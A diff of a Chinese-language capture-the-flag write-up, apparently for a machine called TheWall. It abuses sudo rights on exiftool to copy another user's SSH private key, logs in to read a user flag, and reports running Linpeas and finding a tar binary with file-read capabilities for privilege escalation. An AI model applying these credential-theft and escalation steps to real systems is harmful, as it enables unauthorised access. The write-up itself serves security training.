@@ -124,10 +124,28 @@ sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id
 
 换一个思路读取ssh私钥
 ```c
-sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa+
+sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa
 
 ┌──(root㉿kali)-[~/.ssh]
 └─# ssh -i id_rsa john@192.168.18.238
 ```
 
 
+```C
+┌──(root㉿kali)-[~]
+└─# ssh john@192.168.18.238
+
+john@TheWall:~$ cat user.txt
+cc5db5e7b0a26e807765f47a006f6221
+```
+
+# 提权-
+
+
+我已经使用**scp**将**Linpeas**复制到机器中，如下所示
+
+**豌豆**发现了这一点：
+```c
+Files with capabilities (limited to 50):
+/usr/sbin/tar cap_dac_read_search=ep
+```
